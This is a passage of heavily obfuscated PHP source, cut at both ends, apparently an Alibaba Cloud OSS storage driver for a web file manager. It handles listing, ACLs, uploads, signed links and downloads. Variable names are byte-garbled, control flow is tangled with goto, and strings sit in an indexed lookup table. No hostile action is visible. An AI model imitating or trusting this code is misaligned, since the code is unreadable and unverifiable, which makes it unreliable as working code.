{ return !1; } } return !0; } public function rename($eŠ‚íÊÏâ¹, $A¦ºùÒ¹ï) { return $this->renameObject($eŠ‚íÊÏâ¹, $A¦ºùÒ¹ï); } private function fileInfo($aÅ’›°—‚, $cÍåÏÊšï = false, $E¦íÈÙÑ¡ = array()) { goto cèŒ –ç‹; cèŒ –ç‹: $dâó‹“ëÑ… =& $_SERVER[¹…ÕÄ]; $cÎ§”æÅĞô = array($dâó‹“ëÑ…[28] => $this->pathThis($aÅ’›°—‚), $dâó‹“ëÑ…[75] => $this->getPathOuter($aÅ’›°—‚), $dâó‹“ëÑ…[29] => $dâó‹“ëÑ…[173], $dâó‹“ëÑ…[77] => isset($E¦íÈÙÑ¡[$dâó‹“ëÑ…[77]]) ? $E¦íÈÙÑ¡[$dâó‹“ëÑ…[77]] : 0, $dâó‹“ëÑ…[167] => $this->ext($aÅ’›°—‚)); if ($cÍåÏÊšï) { return $cÎ§”æÅĞô; } goto F˜ÅˆÊá¹í; DÊµã·¦‰¡: if (isset($E¦íÈÙÑ¡[$dâó‹“ëÑ…[77]])) { $cÎ§”æÅĞô[$dâó‹“ëÑ…[77]] = $E¦íÈÙÑ¡[$dâó‹“ëÑ…[77]]; } if (isset($E¦íÈÙÑ¡[$dâó‹“ëÑ…[83]])) { $cÎ§”æÅĞô[$dâó‹“ëÑ…[83]] = $E¦íÈÙÑ¡[$dâó‹“ëÑ…[83]]; } if (isset($E¦íÈÙÑ¡[$dâó‹“ëÑ…[195]]) && !trim($cÎ§”æÅĞô[$dâó‹“ëÑ…[83]])) { $cÎ§”æÅĞô[$dâó‹“ëÑ…[83]] = $E¦íÈÙÑ¡[$dâó‹“ëÑ…[195]]; } goto e‹„âÛõ…Í; e‹„âÛõ…Í: return $cÎ§”æÅĞô; goto FÓößãéì; F˜ÅˆÊá¹í: $cÎ§”æÅĞô[$dâó‹“ëÑ…[192]] = $cÎ§”æÅĞô[$dâó‹“ëÑ…[83]] = 0; $cÎ§”æÅĞô[$dâó‹“ëÑ…[193]] = $cÎ§”æÅĞô[$dâó‹“ëÑ…[194]] = !0; if (empty($E¦íÈÙÑ¡)) { $dŞµ…äŠôÂ = $this->objectMeta($aÅ’›°—‚); if (!$dŞµ…äŠôÂ) { return $cÎ§”æÅĞô; } $E¦íÈÙÑ¡ = array($dâó‹“ëÑ…[83] => strtotime($dŞµ…äŠôÂ[$dâó‹“ëÑ…[1252]]), $dâó‹“ëÑ…[77] => $dŞµ…äŠôÂ[$dâó‹“ëÑ…[1251]] + 0); } goto DÊµã·¦‰¡; FÓößãéì: } private function folderInfo($dÕÖ„¿‹‹«, $fÑÎ•Ì½¼è = false, $d©•ˆ©ò§ = array()) { goto e‹“á©öø¢; e‹“á©öø¢: $DÇæòÃË =& $_SERVER[¹…ÕÄ]; $få»³À©ƒ = array($DÇæòÃË[28] => $this->pathThis($dÕÖ„¿‹‹«), $DÇæòÃË[75] => $this->getPathOuter($DÇæòÃË[8] . $dÕÖ„¿‹‹«), $DÇæòÃË[29] => $DÇæòÃË[76]); if ($fÑÎ•Ì½¼è) { return $få»³À©ƒ; } goto a¥Ê¿ßÙª; Bùµ¬µ§Áí: if (isset($d©•ˆ©ò§[$DÇæòÃË[83]])) { $få»³À©ƒ[$DÇæòÃË[83]] = $d©•ˆ©ò§[$DÇæòÃË[83]]; } if (isset($d©•ˆ©ò§[$DÇæòÃË[192]])) { $få»³À©ƒ[$DÇæòÃË[192]] = $d©•ˆ©ò§[$DÇæòÃË[192]]; } return $få»³À©ƒ; goto f‚°¬‘ªÊ…; a¥Ê¿ßÙª: $få»³À©ƒ[$DÇæòÃË[192]] = $få»³À©ƒ[$DÇæòÃË[83]] = 0; $få»³À©ƒ[$DÇæòÃË[193]] = $få»³À©ƒ[$DÇæòÃË[194]] = !0; if (empty($d©•ˆ©ò§)) { $dÕÖ„¿‹‹« = rtrim($dÕÖ„¿‹‹«, $DÇæòÃË[8]) . $DÇæòÃË[8]; $C˜İ‹ÊçÆì = $this->objectMeta($dÕÖ„¿‹‹«); if (!$C˜İ‹ÊçÆì) { return $få»³À©ƒ; } $d©•ˆ©ò§ = array($DÇæòÃË[192] => $C˜İ‹ÊçÆì[$DÇæòÃË[1259]][$DÇæòÃË[1260]], $DÇæòÃË[83] => strtotime($C˜İ‹ÊçÆì[$DÇæòÃË[1252]])); } goto Bùµ¬µ§Áí; f‚°¬‘ªÊ…: } public function listPath($BÕ‰¶¥¢ø†, $B‡ÕáÌâ¼ = false) { $bá¨ß¤ÒÑ =& $_SERVER[¹…ÕÄ]; $f†ùÑÓÑ¹÷ = $this->fileList($BÕ‰¶¥¢ø†, $bá¨ß¤ÒÑ[8], !0); foreach ($f†ùÑÓÑ¹÷[$bá¨ß¤ÒÑ[74]] as $c‚ì¶­¯££ => $föœ”âÖ³¾) { $f†ùÑÓÑ¹÷[$bá¨ß¤ÒÑ[74]][$c‚ì¶­¯££] = $this->folderInfo($föœ”âÖ³¾, $B‡ÕáÌâ¼, $föœ”âÖ³¾); } foreach ($f†ùÑÓÑ¹÷[$bá¨ß¤ÒÑ[73]] as $c‚ì¶­¯££ => $föœ”âÖ³¾) { $f†ùÑÓÑ¹÷[$bá¨ß¤ÒÑ[73]][$c‚ì¶­¯££] = $this->fileInfo($föœ”âÖ³¾[$bá¨ß¤ÒÑ[28]], $B‡ÕáÌâ¼, $föœ”âÖ³¾); } return $f†ùÑÓÑ¹÷; } public function has($B³©Ê‡†õØ, $aíÀÁàøÈİ = false, $EùîÆ¹¦ä = true) { goto AßŞ‘½µ; AßŞ‘½µ: $b²¼îµˆˆ³ =& $_SERVER[¹…ÕÄ]; $B³©Ê‡†õØ = trim($B³©Ê‡†õØ, $b²¼îµˆˆ³[8]); $eÅ¦¾ñóŸö = empty($B³©Ê‡†õØ) ? $b²¼îµˆˆ³[33] : $B³©Ê‡†õØ . $b²¼îµˆˆ³[8]; goto cöˆ›ì´¥×; BÄ¢ŞÉä‹: while (!0) { check_abort(); $Cªãó›„Š› = array($b²¼îµˆˆ³[1247] => $b²¼îµˆˆ³[8], $b²¼îµˆˆ³[1248] => $eÅ¦¾ñóŸö, $b²¼îµˆˆ³[1249] => $E¸¼ ï…±Ë, $b²¼îµˆˆ³[1250] => $eÎŸ¦ùÊ±ï); try { $a‚ˆ³‹å£‹ = $this->client->listObjects($this->bucket, $Cªãó›„Š›); } catch (OSS\Core\OssException $d«Â¬’İ) { break; } $eÎŸ¦ùÊ±ï = $a‚ˆ³‹å£‹->getNextMarker(); $c‚Í‡Ù¸œ = $a‚ˆ³‹å£‹->getObjectList(); $cÃâ¤˜Æµ‚ = $a‚ˆ³‹å£‹->getPrefixList(); if ($aíÀÁàøÈİ) { if (count($c‚Í‡Ù¸œ) > 1 || count($c‚Í‡Ù¸œ) == 1 && $c‚Í‡Ù¸œ[0]->getKey() != $eÅ¦¾ñóŸö) { $BÊ“‡ÓÇÇ += count($c‚Í‡Ù¸œ) - 1; } if (!empty($cÃâ¤˜Æµ‚)) { $dŒÂô¦ï += count($cÃâ¤˜Æµ‚); } if ($eÎŸ¦ùÊ±ï === $b²¼îµˆˆ³[33]) { break; } continue; } if ($EùîÆ¹¦ä) { if (!empty($c‚Í‡Ù¸œ)) { if (count($c‚Í‡Ù¸œ) > 1 || $c‚Í‡Ù¸œ[0]->getKey() != $eÅ¦¾ñóŸö) { return !0; } } } else { if (!empty($cÃâ¤˜Æµ‚)) { return !0; } } if ($eÎŸ¦ùÊ±ï === $b²¼îµˆˆ³[33]) { break; } } if ($aíÀÁàøÈİ) { return array($b²¼îµˆˆ³[201] => $BÊ“‡ÓÇÇ, $b²¼îµˆˆ³[202] => $dŒÂô¦ï); } return !1; goto FÁ„òœò§; cöˆ›ì´¥×: $eÎŸ¦ùÊ±ï = $b²¼îµˆˆ³[33]; $E¸¼ ï…±Ë = 500; $BÊ“‡ÓÇÇ = $dŒÂô¦ï = 0; goto BÄ¢ŞÉä‹; FÁ„òœò§: } public function listAll($Fæƒ…£ä²à) { $e¨„²¢ŒÀ =& $_SERVER[¹…ÕÄ]; $d¤¯¹Ä´Š = $this->fileList($Fæƒ…£ä²à, $e¨„²¢ŒÀ[33], !0); $bøÕ˜¬ ï£ = array(); foreach ($d¤¯¹Ä´Š[$e¨„²¢ŒÀ[73]] as $AÄ°ê™ÁÔ¶) { $bøÕ˜¬ ï£[$AÄ°ê™ÁÔ¶[$e¨„²¢ŒÀ[28]]] = $AÄ°ê™ÁÔ¶[$e¨„²¢ŒÀ[77]]; } foreach ($d¤¯¹Ä´Š[$e¨„²¢ŒÀ[74]] as $AÄ°ê™ÁÔ¶) { if (is_string($AÄ°ê™ÁÔ¶)) { $bøÕ˜¬ ï£[$AÄ°ê™ÁÔ¶] = 0; } } return $this->listAllFiles($Fæƒ…£ä²à, array_keys($bøÕ˜¬ ï£), $bøÕ˜¬ ï£); } public function canRead($A°†Ì“¥İ) { $Aã‚óÚ¡ =& $_SERVER[¹…ÕÄ]; $F¯¼­²Š¨ = $this->pathAcl($A°†Ì“¥İ); return $F¯¼­²Š¨ == $Aã‚óÚ¡[1261] || $F¯¼­²Š¨ == $Aã‚óÚ¡[514] ? !0 : !1; } public function canWrite($dËÊµçµİ) { $Eùª•…ˆ = $this->pathAcl($dËÊµçµİ); return $Eùª•…ˆ == $_SERVER[¹…ÕÄ][514] ? !0 : !1; } public function pathAcl($d¡ô‹Ã‡†Ä) { goto EùÁ»Ó×—Ù; EùÁ»Ó×—Ù: $FÙ¯ÂÄ‡Ö =& $_SERVER[¹…ÕÄ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $fÉ‡Ñ¤Ô¼ä = $this->client->getObjectAcl($this->bucket, $this->pathEncode($d¡ô‹Ã‡†Ä)); } catch (OSS\Core\OssException $Dó“Î¤Áò) { return !1; } goto FõêŒ¬õÁ; Bàßø—öóî: return $eå—±Íñ¶Ç; goto BİËœ¢ ; FõêŒ¬õÁ: $eå—±Íñ¶Ç = $fÉ‡Ñ¤Ô¼ä == $FÙ¯ÂÄ‡Ö[34] ? $this->bucketAcl : $fÉ‡Ñ¤Ô¼ä; if ($eå—±Íñ¶Ç == $FÙ¯ÂÄ‡Ö[1262]) { return $FÙ¯ÂÄ‡Ö[1261]; } if ($eå—±Íñ¶Ç == $FÙ¯ÂÄ‡Ö[1263]) { return $FÙ¯ÂÄ‡Ö[514]; } goto Bàßø—öóî; BİËœ¢ : } private function chmodPath($BƒŞ÷ñë³, $C“Š‡ˆõÎ = '') { $D²ï¶Üéô‘ =& $_SERVER[¹…ÕÄ]; $AÂ¬…Òšæë = empty($C“Š‡ˆõÎ) ? $D²ï¶Üéô‘[1263] : $C“Š‡ˆõÎ; $bö§ùòØà = array($D²ï¶Üéô‘[34], $D²ï¶Üéô‘[191], $D²ï¶Üéô‘[1262], $D²ï¶Üéô‘[1263]); if (!in_array($AÂ¬…Òšæë, $bö§ùòØà)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($BƒŞ÷ñë³), $AÂ¬…Òšæë); } catch (OSS\Core\OssException $f…¨°ÛÈ¸‘) { return !1; } return !0; } public function getContent($D†‰¯ßõ§È) { return $this->fileSubstr($D†‰¯ßõ§È, -1); } public function setContent($c“„¯›ˆöƒ, $bÎâÈÂ·– = '') { $e„Ï§§Î˜é =& $_SERVER[¹…ÕÄ]; try { $bÚŸ‰÷ƒä– = $this->trafficLimit($e„Ï§§Î˜é[1264]); $Dæî¨‹¦–ù = $this->client->putObject($this->bucket, $this->pathEncode($c“„¯›ˆöƒ), $bÎâÈÂ·–, $bÚŸ‰÷ƒä–); } catch (OSS\Core\OssException $Dèã±ºÄ–) { return !1; } $D‚¥ôÆäíØ = array($e„Ï§§Î˜é[1253] => trim($Dæî¨‹¦–ù[$e„Ï§§Î˜é[1265]], $e„Ï§§Î˜é[115]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($c“„¯›ˆöƒ))); $this->updateObjMeta($c“„¯›ˆöƒ, $D‚¥ôÆäíØ); return isset($Dæî¨‹¦–ù[$e„Ï§§Î˜é[1266]][$e„Ï§§Î˜é[1212]]) ? !0 : !1; } private function updateObjMeta($E×æŒÃííƒ, $fÊ‰˜Œ‹’Ó) { $E×æŒÃííƒ = $this->pathEncode($E×æŒÃííƒ); try { $A˜éÂ’øÀ = array(OSS\OssClient::OSS_HEADERS => $fÊ‰˜Œ‹’Ó); $this->client->copyObject($this->bucket, $E×æŒÃííƒ, $this->bucket, $E×æŒÃííƒ, $A˜éÂ’øÀ); } catch (OSS\Core\OssException $c–æó‰’ƒ) { return !1; } return !0; } public function upload($fÀ·ùÓ—“©, $eô³õ‰÷“Ğ, $DÃî“–˜«Å = false, $D¤ß®ÁÌ— = REPEAT_REPLACE) { $cäØéî„½Ú =& $_SERVER[¹…ÕÄ]; $e…ä”á”¬ = trim($fÀ·ùÓ—“©, $cäØéî„½Ú[8]); $b‹–ÃĞ½· = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($cäØéî„½Ú[1253] => @md5_file($eô³õ‰÷“Ğ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($fÀ·ùÓ—“©))); $b‹–ÃĞ½· = $this->trafficLimit($cäØéî„½Ú[1264], $b‹–ÃĞ½·); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($e…ä”á”¬), $eô³õ‰÷“Ğ, $b‹–ÃĞ½·); } catch (OSS\Core\OssException $b¸ù“„—ï˜) { return !1; } return $this->getPathOuter($fÀ·ùÓ—“©); } public function getHost() { $eŠÓùôÇ‚À =& $_SERVER[¹…ÕÄ]; $eªøÂƒÃ‘‚ = explode($eŠÓùôÇ‚À[177], parent::getHost()); return $eªøÂƒÃ‘‚[0] . $eŠÓùôÇ‚À[177] . $this->bucket . $eŠÓùôÇ‚À[94] . $eªøÂƒÃ‘‚[1]; } public function uploadFormData($Dß­¨îŒ¶, $eÎ…»·èğ = 3600) { goto EòØãÇá; Fò”×¦§ï˜: $eâ¦ùÙÆœÒ = date($eŸÏ×’«Ş²[1267], time() + $c÷ŸÍö”ÀŠ); $AÇñ…¢·„ö = new DateTime($eâ¦ùÙÆœÒ); $F¸å±ç¬¡ğ = $AÇñ…¢·„ö->format(DateTime::ISO8601); goto eÄ„¹Š§; eÄ„¹Š§: $B‹Ò»îî²¾ = strpos($F¸å±ç¬¡ğ, $eŸÏ×’«Ş²[292]); $F¸å±ç¬¡ğ = substr($F¸å±ç¬¡ğ, 0, $B‹Ò»îî²¾) . $eŸÏ×’«Ş²[1268]; $e§‡îâ’ë¸ = 1048576000 * 5; goto E‡Ô†Ë¶–Ä; A“ÆËŸ»Ñœ: $açÆœÉ¡¶ = base64_encode(hash_hmac($eŸÏ×’«Ş²[228], $D‘Ñƒî²ä, $this->secret, !0)); $eá»ªˆ«‡– = array($eŸÏ×’«Ş²[1178] => $D‘Ñƒî²ä, $eŸÏ×’«Ş²[1270] => $this->accessKey, $eŸÏ×’«Ş²[1174] => $eŸÏ×’«Ş²[1166], $eŸÏ×’«Ş²[1271] => $açÆœÉ¡¶, $eŸÏ×’«Ş²[175] => $aóğîƒ„‚²); $eá»ªˆ«‡– = $this->trafficLimit($eŸÏ×’«Ş²[1264], $eá»ªˆ«‡–); goto A¹Ç³šéØ; A¹Ç³šéØ: return $eá»ªˆ«‡–; goto CìïóÜİ; EòØãÇá: $eŸÏ×’«Ş² =& $_SERVER[¹…ÕÄ]; if (!($aóğîƒ„‚² = $this->getHost())) { return !1; } $c÷ŸÍö”ÀŠ = $eÎ…»·èğ; goto Fò”×¦§ï˜; E‡Ô†Ë¶–Ä: $b‡Á†Áìâ = $this->pathFather($Dß­¨îŒ¶); $Bø‰¬‡ˆê÷ = array($eŸÏ×’«Ş²[1168] => $F¸å±ç¬¡ğ, $eŸÏ×’«Ş²[1169] => array(array($eŸÏ×’«Ş²[1269], 0, $e§‡îâ’ë¸), array($eŸÏ×’«Ş²[1172], $eŸÏ×’«Ş²[1173], $b‡Á†Áìâ))); $D‘Ñƒî²ä = base64_encode(json_encode($Bø‰¬‡ˆê÷)); goto A“ÆËŸ»Ñœ; CìïóÜİ: } public function multiUploadFormData($d†¥Üæ©¦†, $dÄ–ñŒóÚ× = 3600) { $AòÒÎò¸ğ° =& $_SERVER[¹…ÕÄ]; if (!($dïš£Ûã¡ƒ = $this->getHost())) { return !1; } $c¬ïˆ¡Õø = $this->trafficLimit($AòÒÎò¸ğ°[1264]); $bÄœÀ›‹ò¯ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($d†¥Üæ©¦†), $c¬ïˆ¡Õø); return array($AòÒÎò¸ğ°[219] => $bÄœÀ›‹ò¯, $AòÒÎò¸ğ°[175] => $dïš£Ûã¡ƒ . $AòÒÎò¸ğ°[8] . $this->pathEncode($d†¥Üæ©¦†), $AòÒÎò¸ğ°[220] => gmdate($AòÒÎò¸ğ°[1272]), $AòÒÎò¸ğ°[92] => $d†¥Üæ©¦†); } public function multiUploadAuthData($bĞ×¢¢¤Åˆ, $D†Ô­øàîÜ = array()) { goto F•Áš’Ï¶; F•Áš’Ï¶: $CåİÙ¦Áä =& $_SERVER[¹…ÕÄ]; $fÎÃóéâ„æ = isset($D†Ô­øàîÜ[$CåİÙ¦Áä[220]]) ? $D†Ô­øàîÜ[$CåİÙ¦Áä[220]] : gmdate($CåİÙ¦Áä[1272]); $dâùÁ Œà = isset($D†Ô­øàîÜ[$CåİÙ¦Áä[167]]) ? $D†Ô­øàîÜ[$CåİÙ¦Áä[167]] : $CåİÙ¦Áä[33]; goto CŠ¢Ï¡õâ´; CŠ¢Ï¡õâ´: $FÇ„¿‚è‰ = $bĞ×¢¢¤Åˆ; if (isset($D†Ô­øàîÜ[$CåİÙ¦Áä[92]])) { $FÇ„¿‚è‰ = $D†Ô­øàîÜ[$CåİÙ¦Áä[92]]; unset($D†Ô­øàîÜ[$CåİÙ¦Áä[92]]); } if (isset($D†Ô­øàîÜ[$CåİÙ¦Áä[221]])) { $D†Ô­øàîÜ[$CåİÙ¦Áä[220]] = $fÎÃóéâ„æ; return $this->listUploadParts($FÇ„¿‚è‰, $D†Ô­øàîÜ); } goto b‡ï•¸ŒŒ; DÕ˜ê¦§Œ: $c‰ÊÚî£Ì = $CåİÙ¦Áä[1237] . $this->accessKey . $CåİÙ¦Áä[4] . $bİ„ƒ±”™; if (strpos($dâùÁ Œà, $CåİÙ¦Áä[223]) === 0) { $c‰ÊÚî£Ì = array($CåİÙ¦Áä[230] => $c‰ÊÚî£Ì, $CåİÙ¦Áä[220] => $fÎÃóéâ„æ); if ($FÔ¢–¬Şï) { $c‰ÊÚî£Ì = array_merge($c‰ÊÚî£Ì, $FÔ¢–¬Şï); } } return $c‰ÊÚî£Ì; goto DĞ“Á›ˆà±; e¨âêÄ– : if (!empty($D†Ô­øàîÜ[$CåİÙ¦Áä[1274]])) { $C‰Ä·ì…³ = array_merge(array($B›ÏŒ§á»È[4]), $D†Ô­øàîÜ[$CåİÙ¦Áä[1274]]); sort($C‰Ä·ì…³); $B›ÏŒ§á»È[4] = implode($CåİÙ¦Áä[227], $C‰Ä·ì…³); } $b½‚õ„¦© = implode($CåİÙ¦Áä[227], $B›ÏŒ§á»È); $bİ„ƒ±”™ = base64_encode(hash_hmac($CåİÙ¦Áä[228], $b½‚õ„¦©, $this->secret, !0)); goto DÕ˜ê¦§Œ; b‡ï•¸ŒŒ: $B›ÏŒ§á»È = array($CåİÙ¦Áä[222], $CåİÙ¦Áä[33], $CåİÙ¦Áä[118], $fÎÃóéâ„æ, "\x78\55\157\x73\163\x2d\x64\141\164\145\x3a{$fÎÃóéâ„æ}", $CåİÙ¦Áä[8] . $this->bucket . $CåİÙ¦Áä[8] . $FÇ„¿‚è‰ . $dâùÁ Œà); if (strpos($dâùÁ Œà, $CåİÙ¦Áä[223]) === 0) { $B›ÏŒ§á»È[0] = $CåİÙ¦Áä[224]; if ($FÔ¢–¬Şï = $this->trafficLimit($CåİÙ¦Áä[1264])) { $FÇ„¿‚è‰ = $CåİÙ¦Áä[1273]; array_splice($B›ÏŒ§á»È, 5, 0, $FÇ„¿‚è‰ . $CåİÙ¦Áä[4] . $FÔ¢–¬Şï[$FÇ„¿‚è‰]); } } if (isset($D†Ô­øàîÜ[$CåİÙ¦Áä[225]]) && $D†Ô­øàîÜ[$CåİÙ¦Áä[225]] == $CåİÙ¦Áä[226]) { $B›ÏŒ§á»È[0] = $CåİÙ¦Áä[226]; } goto e¨âêÄ– ; DĞ“Á›ˆà±: } public function listUploadParts($C¬Ã‚¶Âç¼, $D÷İéÙŞŠˆ) { goto D©Å„ùêç; D©Å„ùêç: $d¹˜Í¨ÙŸ =& $_SERVER[¹…ÕÄ]; $BáÕØåï¡Ğ = parse_url_query($D÷İéÙŞŠˆ[$d¹˜Í¨ÙŸ[167]]); $F¥Û¦§õï› = $this->client->listParts($this->bucket, $this->pathEncode($C¬Ã‚¶Âç¼), $BáÕØåï¡Ğ[$d¹˜Í¨ÙŸ[219]]); goto B‰ÁéÍ ”; CàÌñ†ºÕØ: unset($D÷İéÙŞŠˆ[$d¹˜Í¨ÙŸ[221]], $D÷İéÙŞŠˆ[$d¹˜Í¨ÙŸ[225]]); $b”‘¶ïÄëõ = $this->multiUploadAuthData($C¬Ã‚¶Âç¼, $D÷İéÙŞŠˆ); if (empty($b”‘¶ïÄëõ)) { return !1; } goto E˜ª¿Åòƒ; E˜ª¿Åòƒ: return array($d¹˜Í¨ÙŸ[230] => $b”‘¶ïÄëõ, $d¹˜Í¨ÙŸ[220] => $D÷İéÙŞŠˆ[$d¹˜Í¨ÙŸ[220]], $d¹˜Í¨ÙŸ[232] => $A”ï†ÈÌ™ß); goto c˜øªëÇÅ×; B‰ÁéÍ ”: $C“×á‚‘Œò = $F¥Û¦§õï›->getListPart(); $A”ï†ÈÌ™ß = array(); foreach ($C“×á‚‘Œò as $eƒ¹ªŒ‹«¶) { $A”ï†ÈÌ™ß[] = array($d¹˜Í¨ÙŸ[1257] => $eƒ¹ªŒ‹«¶->getPartNumber(), $d¹˜Í¨ÙŸ[1258] => trim($eƒ¹ªŒ‹«¶->getETag(), $d¹˜Í¨ÙŸ[115])); } goto CàÌñ†ºÕØ; c˜øªëÇÅ×: } public function download($A©˜ßœ¡¦, $A‹—ĞçÃ™–) { if ($this->isFolder($A©˜ßœ¡¦)) { return !1; } try { $Eä”“¸Òì = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $A‹—ĞçÃ™–); $Eä”“¸Òì = $this->trafficLimit($_SERVER[¹…ÕÄ][108], $Eä”“¸Òì); $this->client->getObject($this->bucket, $this->pathEncode($A©˜ßœ¡¦), $Eä”“¸Òì); } catch (OSS\Core\OssException $aºª»»¨Éç) { return !1; } return $A‹—ĞçÃ™–; } public function fileSubstr($cÔŒ¶ó¯ˆˆ, $b÷¯ÉÈ»Î = 0, $a“©ãåŠ‘ = false) { if ($b÷¯ÉÈ»Î === -1) { $cƒ¯Ôğó‚½ = array(); } else { if ($a“©ãåŠ‘ === !1) { $E÷¨×«Ÿ¹ = $this->size($cÔŒ¶ó¯ˆˆ); } else { $E÷¨×«Ÿ¹ = $b÷¯ÉÈ»Î + $a“©ãåŠ‘ - 1; } $cƒ¯Ôğó‚½ = array(OSS\OssClient::OSS_RANGE => "{$b÷¯ÉÈ»Î}\x2d{$E÷¨×«Ÿ¹}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($cÔŒ¶ó¯ˆˆ), $cƒ¯Ôğó‚½); } catch (OSS\Core\OssException $Fñ’«â÷–Û) { think_exception($Fñ’«â÷–Û->getMessage()); return !1; } } private function trafficLimit($eíÛŠÊñ±š, $dëÇÕ¯î˜ = array()) { goto A®Â‘Õâî; fÎçó™ï»¸: return $dëÇÕ¯î˜; goto eÏÀ¸…İ·µ; EÙÁ›²î¡„: if (!$CÉÃçÙƒ‹) { return $dëÇÕ¯î˜; } $CÉÃçÙƒ‹ = $CÉÃçÙƒ‹ < 819200 ? 819200 : ($CÉÃçÙƒ‹ > 838860800 ? 838860800 : $CÉÃçÙƒ‹); $dëÇÕ¯î˜[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($CÉÃçÙƒ‹); goto fÎçó™ï»¸; A®Â‘Õâî: $eë×¾ØÕè¶ =& $_SERVER[¹…ÕÄ]; if ($eíÛŠÊñ±š == $eë×¾ØÕè¶[1264] && $this->isUploadServer() || $eíÛŠÊñ±š == $eë×¾ØÕè¶[108] && $this->isFileOutServer()) { return $dëÇÕ¯î˜; } $CÉÃçÙƒ‹ = floatval($GLOBALS[$eë×¾ØÕè¶[6]][$eë×¾ØÕè¶[87]][$eë×¾ØÕè¶[106]][$eíÛŠÊñ±š]) * 1024 * 1024 * 8; goto EÙÁ›²î¡„; eÏÀ¸…İ·µ: } public function link($eÔêÂ”îÅ, $f½³“×Ù = array()) { $DÁÉ²³Êá =& $_SERVER[¹…ÕÄ]; if (!$this->exist($eÔêÂ”îÅ) || $this->isFolder($eÔêÂ”îÅ)) { return !1; } try { $f½³“×Ù = $this->trafficLimit($DÁÉ²³Êá[108], $f½³“×Ù); $eìò¬«—ë¯ = $this->client->signUrl($this->bucket, $this->pathEncode($eÔêÂ”îÅ), 3600 * 12, $DÁÉ²³Êá[226], $f½³“×Ù); return $this->getCdnLink($eìò¬«—ë¯); } catch (OSS\Core\OssException $DÁ®ñ°) { return !1; } } public function fileOut($Cñ£ïã£ƒÑ, $bÈåæ¬ƒ®â = false, $e¬³•ÍÈäÇ = false, $fù¼ŒÚé¿Ô = '') { goto AŒåˆ”µœ; D×ÏÌŒ¹Ïê: $bÈåæ¬ƒ®â = $bÈåæ¬ƒ®â ? $A¿„ØÇ•ñÍ[212] : $A¿„ØÇ•ñÍ[213]; $bÌ¥†§ÉéÔ = array(OSS\OssClient::OSS_SUB_RESOURCE => $A¿„ØÇ•ñÍ[1275] . rawurlencode("{$bÈåæ¬ƒ®â}\x3b\146\x69\x6c\145\x6e\141\155\x65\x3d{$e¬³•ÍÈäÇ}")); $bÌ¥†§ÉéÔ[OSS\OssClient::OSS_SUB_RESOURCE] .= $A¿„ØÇ•ñÍ[1276] . rawurlencode($aøßˆÒÕ÷Ò); goto f’†¨Ìè……; f’†¨Ìè……: $c×šÇ«–¡ = $this->link($Cñ£ïã£ƒÑ, $bÌ¥†§ÉéÔ); $this->fileOutLink($c×šÇ«–¡); goto CÓÑÑ´Üœ; AŒåˆ”µœ: $A¿„ØÇ•ñÍ =& $_SERVER[¹…ÕÄ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Cñ£ïã£ƒÑ, $bÈåæ¬ƒ®â, $e¬³•ÍÈäÇ, $fù¼ŒÚé¿Ô); } if (!$e¬³•ÍÈäÇ) { $e¬³•ÍÈäÇ = $this->pathThis($Cñ£ïã£ƒÑ); } goto Eª™ëèí¡‚; Eª™ëèí¡‚: $e¬³•ÍÈäÇ = rawurlencode($e¬³•ÍÈäÇ); $aøßˆÒÕ÷Ò = get_file_mime(get_path_ext($e¬³•ÍÈäÇ)); if ($aøßˆÒÕ÷Ò == $A¿„ØÇ•ñÍ[211]) { return parent::fileOut($Cñ£ïã£ƒÑ, $bÈåæ¬ƒ®â, $e¬³•ÍÈäÇ, $fù¼ŒÚé¿Ô); } goto D×ÏÌŒ¹Ïê; CÓÑÑ´Üœ: } public function fileOutServer($b’ˆ¸ñİ‘, $C²¬ÒñĞÚƒ = false, $dæøÚµÎ°‰ = false, $DøÃïÔÚ¢ = '') { parent::fileOut($b’ˆ¸ñİ‘, $C²¬ÒñĞÚƒ, $dæøÚµÎ°‰, $DøÃïÔÚ¢); } public function fileOutImage($c§÷ª¤¼Çš, $aßÂÏˆ½ğ„ = 250) { $BÇÃŞ‚¯¬¨ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¹…ÕÄ][1277] . $aßÂÏˆ½ğ„); $bŠÌ¢Ã¦ëÖ = $this->link($c§÷ª¤¼Çš, $BÇÃŞ‚¯¬¨); $this->fileOutLink($bŠÌ¢Ã¦ëÖ); } public function fileOutImageServer($A¨½ÊÏÀåœ, $cŞÚÈë£êŒ = 250) { parent::fileOutImage($A¨½ÊÏÀåœ, $cŞÚÈë£êŒ); } public function fileOutLink($E‘¾Êæ¶­«) { $A±ñùÌŠî =& $_SERVER[¹…ÕÄ]; if (!$this->isCdnHost() && substr($E‘¾Êæ¶­«, 0, 7) == $A±ñùÌŠî[1181]) { $E‘¾Êæ¶­« = $A±ñùÌŠî[1182] . substr($E‘¾Êæ¶­«, 7); } header($A±ñùÌŠî[158] . $E‘¾Êæ¶­«); die; } public function hashMd5($E»•¥œïÇÆ, $c‰¯—ù™Ûè = '') { $díÓ”ÅÙò£ =& $_SERVER[¹…ÕÄ]; $fêå®‰Ç = $this->_objectMeta($E»•¥œïÇÆ); if (!$fêå®‰Ç) { return $díÓ”ÅÙò£[33]; } if (!isset($fêå®‰Ç[$díÓ”ÅÙò£[1253]]) && !empty($c‰¯—ù™Ûè)) { $C»™í¿“İÊ = $this->updateObjMeta($E»•¥œïÇÆ, array($díÓ”ÅÙò£[1253] => $c‰¯—ù™Ûè)); $fêå®‰Ç[$díÓ”ÅÙò£[1253]] = $C»™í¿“İÊ ? $c‰¯—ù™Ûè : $díÓ”ÅÙò£[33]; } return isset($fêå®‰Ç[$díÓ”ÅÙò£[1253]]) ? strtolower($fêå®‰Ç[$díÓ”ÅÙò£[1253]]) : $díÓ”ÅÙò£[33]; } public function size($EõéÔ”¼…) { $eÆ¬ = 